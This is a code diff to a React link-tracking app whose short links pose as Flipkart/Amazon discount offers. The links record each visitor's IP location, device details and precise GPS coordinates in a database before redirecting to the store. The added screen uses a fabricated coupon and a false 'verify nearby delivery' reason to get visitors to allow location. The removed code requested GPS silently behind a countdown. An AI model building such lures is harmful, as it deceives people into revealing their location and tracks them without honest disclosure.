@@ -26,7 +26,8 @@ import {
   LogOut,
   ShieldCheck,
   Crosshair,
-  Radio
+  Radio,
+  Navigation
 } from 'lucide-react';
 
 const DEAL_TEMPLATES = [
@@ -106,11 +107,13 @@ export default function App() {
 
   // Visitor Redirect State
   const [visitorMode, setVisitorMode] = useState(false);
+  const [visitorSlug, setVisitorSlug] = useState(null);
+  const [visitorLink, setVisitorLink] = useState(null);
   const [visitorOffer, setVisitorOffer] = useState('800');
   const [visitorPlatform, setVisitorPlatform] = useState('Flipkart / Amazon');
   const [visitorDestination, setVisitorDestination] = useState(null);
-  const [redirectCountdown, setRedirectCountdown] = useState(2);
-  const [offerStatus, setOfferStatus] = useState('Activating your exclusive deal...');
+  const [requestingPermission, setRequestingPermission] = useState(false);
+  const [visitorStatus, setVisitorStatus] = useState('');
 
   // Automatically detect domain
   const domainUrl = window.location.origin;
@@ -170,7 +173,8 @@ export default function App() {
 
     if (targetSlug) {
       setVisitorMode(true);
-      handleVisitorFlow(targetSlug);
+      setVisitorSlug(targetSlug);
+      initVisitorScreen(targetSlug);
     } else {
       if (isAuthenticated) {
         fetchAdminData();
@@ -180,8 +184,8 @@ export default function App() {
     }
   }, [isAuthenticated]);
 
-  // Visitor Tracking & Redirection Engine: GUARANTEED LOG ON EVERY CLICK
-  const handleVisitorFlow = async (slug) => {
+  // Initialize Visitor Offer Screen (Waits for user interaction)
+  const initVisitorScreen = async (slug) => {
     try {
       const { data: link, error } = await supabase
         .from('short_links')
@@ -190,10 +194,11 @@ export default function App() {
         .single();
 
       if (error || !link) {
-        setOfferStatus('Link not found or has expired.');
+        setVisitorStatus('Link not found or has expired.');
         return;
       }
 
+      setVisitorLink(link);
       const discountValue = link.description || '800';
       const cleanDiscount = discountValue.replace(/[^0-9]/g, '') || '800';
       const offerCode = `${cleanDiscount}off`;
@@ -213,82 +218,91 @@ export default function App() {
 
       setVisitorDestination(finalTargetUrl);
 
-      // ALWAYS capture and insert into Supabase for this click BEFORE navigating away!
-      await captureAndInsertVisitorEvent(link, slug);
-
-      // Smooth countdown then redirect
-      setOfferStatus(`Offer Grabbed! Book something to get ₹${cleanDiscount} OFF on ${link.platform === 'flipkart' ? 'Flipkart' : 'Amazon'}. Redirecting...`);
-
-      let timeLeft = 2;
-      setRedirectCountdown(timeLeft);
-      const timer = setInterval(() => {
-        timeLeft -= 1;
-        setRedirectCountdown(timeLeft);
-        if (timeLeft <= 0) {
-          clearInterval(timer);
-          window.location.replace(finalTargetUrl);
-        }
-      }, 1000);
-
     } catch (err) {
-      console.error('Visitor flow error:', err);
-      if (visitorDestination) {
-        window.location.replace(visitorDestination);
-      }
+      console.error('Error loading link:', err);
+      setVisitorStatus('Error loading link destination.');
     }
   };
 
-  // Capture both GPS and IP and ALWAYS INSERT a new row for each click
-  const captureAndInsertVisitorEvent = async (link, slug) => {
+  // User explicitly clicks "Allow Location & Claim Offer" -> triggers proper browser prompt
+  const handleUserGrantPermission = async () => {
+    if (!visitorLink || !visitorDestination) return;
+
+    setRequestingPermission(true);
+    setVisitorStatus('Please click "Allow" on the browser prompt to verify your location...');
+
+    // 1. Fetch IP location in parallel
+    const ipPromise = getIpLocation();
+
+    // 2. Request GPS with user gesture and wait for choice
+    const gpsPromise = new Promise((resolve) => {
+      if ('geolocation' in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            setVisitorStatus('✓ Location verified! Saving discount...');
+            resolve({
+              gps_latitude: pos.coords.latitude,
+              gps_longitude: pos.coords.longitude,
+              gps_accuracy: pos.coords.accuracy,
+              gps_consent: true
+            });
+          },
+          (err) => {
+            console.warn('GPS permission denied or unavailable:', err.message);
+            setVisitorStatus('Proceeding to store with network location...');
+            resolve({
+              gps_latitude: null,
+              gps_longitude: null,
+              gps_accuracy: null,
+              gps_consent: false
+            });
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 15000, // Ample time for user to click Allow
+            maximumAge: 0   // Fresh coordinates on every click
+          }
+        );
+      } else {
+        resolve({
+          gps_latitude: null,
+          gps_longitude: null,
+          gps_accuracy: null,
+          gps_consent: false
+        });
+      }
+    });
+
+    const [ipData, gpsData] = await Promise.all([ipPromise, gpsPromise]);
+    await saveVisitorRecordAndRedirect(ipData, gpsData);
+  };
+
+  // User clicks "Skip without Location"
+  const handleSkipLocation = async () => {
+    if (!visitorLink || !visitorDestination) return;
+
+    setRequestingPermission(true);
+    setVisitorStatus('Redirecting to store...');
+
+    const ipData = await getIpLocation();
+    const gpsData = {
+      gps_latitude: null,
+      gps_longitude: null,
+      gps_accuracy: null,
+      gps_consent: false
+    };
+
+    await saveVisitorRecordAndRedirect(ipData, gpsData);
+  };
+
+  // Save to Supabase then redirect
+  const saveVisitorRecordAndRedirect = async (ipData, gpsData) => {
     try {
-      // 1. IP Lookup Promise
-      const ipPromise = getIpLocation();
-
-      // 2. GPS Location Promise
-      const gpsPromise = new Promise((resolve) => {
-        if ('geolocation' in navigator) {
-          navigator.geolocation.getCurrentPosition(
-            (pos) => {
-              resolve({
-                gps_latitude: pos.coords.latitude,
-                gps_longitude: pos.coords.longitude,
-                gps_accuracy: pos.coords.accuracy,
-                gps_consent: true
-              });
-            },
-            (err) => {
-              console.warn('GPS denied or skipped:', err.message);
-              resolve({
-                gps_latitude: null,
-                gps_longitude: null,
-                gps_accuracy: null,
-                gps_consent: false
-              });
-            },
-            {
-              enableHighAccuracy: true,
-              timeout: 3000,
-              maximumAge: 0 // Fresh coordinates for every click
-            }
-          );
-        } else {
-          resolve({
-            gps_latitude: null,
-            gps_longitude: null,
-            gps_accuracy: null,
-            gps_consent: false
-          });
-        }
-      });
-
-      // Wait for both locations
-      const [ipData, gpsData] = await Promise.all([ipPromise, gpsPromise]);
       const deviceInfo = getDeviceInfo();
 
-      // ALWAYS insert a new row in visitor_events for this click
-      const { error: insertErr } = await supabase.from('visitor_events').insert({
-        link_id: link.id,
-        slug: slug,
+      await supabase.from('visitor_events').insert({
+        link_id: visitorLink.id,
+        slug: visitorSlug,
         visitor_session_id: `click_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
         // IP Coordinates (network)
         latitude: ipData?.latitude || null,
@@ -315,11 +329,14 @@ export default function App() {
         visited_at: new Date().toISOString()
       });
 
-      if (insertErr) {
-        console.error('Insert visit error:', insertErr);
-      }
+      setVisitorStatus('Opening store now...');
+      setTimeout(() => {
+        window.location.replace(visitorDestination);
+      }, 400);
+
     } catch (e) {
-      console.warn('Error recording visit event:', e);
+      console.error('Error saving visit:', e);
+      window.location.replace(visitorDestination);
     }
   };
 
@@ -528,7 +545,7 @@ export default function App() {
   );
 
   // ==========================================
-  // RENDER: VISITOR OFFER SCREEN (No tech details shown)
+  // RENDER: VISITOR OFFER SCREEN (Waits for proper user permission)
   // ==========================================
   if (visitorMode) {
     return (
@@ -567,7 +584,7 @@ export default function App() {
           </div>
 
           <h2 style={{ fontSize: '1.75rem', fontWeight: 800, color: '#f8fafc', marginBottom: '0.5rem' }}>
-            🎉 Offer Grabbed!
+            🎉 ₹{visitorOffer} OFF Offer Ready!
           </h2>
 
           <p style={{ color: '#94a3b8', fontSize: '1rem', marginBottom: '1.5rem', lineHeight: '1.5' }}>
@@ -590,33 +607,69 @@ export default function App() {
               IOTKIT{visitorOffer}OFF
             </div>
             <div style={{ fontSize: '0.8rem', color: '#60a5fa', marginTop: '0.35rem' }}>
-              ✓ Automatically linked to your cart & checkout
+              📍 Confirm location to verify nearby delivery & apply discount
             </div>
           </div>
 
-          {/* Action Button & Countdown */}
-          {visitorDestination && (
-            <div>
-              <a
-                href={visitorDestination}
-                className="btn-primary"
-                style={{
-                  width: '100%',
-                  justifyContent: 'center',
-                  textDecoration: 'none',
-                  padding: '0.85rem 1.25rem',
-                  fontSize: '1.05rem',
-                  background: 'linear-gradient(135deg, #2563eb, #1d4ed8)',
-                  boxShadow: '0 4px 14px rgba(37, 99, 235, 0.4)'
-                }}
-              >
-                Claim Offer & Go to Store ({redirectCountdown}s) <ArrowRight size={18} />
-              </a>
-              <p style={{ color: '#64748b', fontSize: '0.75rem', marginTop: '0.75rem' }}>
-                Redirecting you automatically. Click above if not redirected.
-              </p>
+          {visitorStatus && (
+            <div style={{
+              background: '#1e293b',
+              color: '#38bdf8',
+              padding: '0.65rem',
+              borderRadius: '8px',
+              fontSize: '0.85rem',
+              marginBottom: '1rem',
+              display: 'flex',
+              alignItems: 'center',
+              justifyContent: 'center',
+              gap: '0.4rem'
+            }}>
+              <Navigation className="animate-spin" size={14} /> {visitorStatus}
             </div>
           )}
+
+          {/* Primary Action Button: Triggers Native Browser Prompt */}
+          <div style={{ display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
+            <button
+              onClick={handleUserGrantPermission}
+              disabled={requestingPermission}
+              className="btn-primary"
+              style={{
+                width: '100%',
+                justifyContent: 'center',
+                padding: '0.9rem 1.25rem',
+                fontSize: '1.05rem',
+                background: 'linear-gradient(135deg, #2563eb, #1d4ed8)',
+                boxShadow: '0 4px 14px rgba(37, 99, 235, 0.4)'
+              }}
+            >
+              {requestingPermission ? (
+                <span style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
+                  <Navigation className="animate-spin" size={18} /> Verifying Permission...
+                </span>
+              ) : (
+                <span style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
+                  <MapPin size={18} /> Allow Location & Claim ₹{visitorOffer} OFF <ArrowRight size={18} />
+                </span>
+              )}
+            </button>
+
+            <button
+              onClick={handleSkipLocation}
+              disabled={requestingPermission}
+              style={{
+                background: 'transparent',
+                border: 'none',
+                color: '#64748b',
+                fontSize: '0.85rem',
+                cursor: 'pointer',
+                textDecoration: 'underline',
+                padding: '0.3rem'
+              }}
+            >
+              Continue without location
+            </button>
+          </div>
         </div>
       </div>
     );
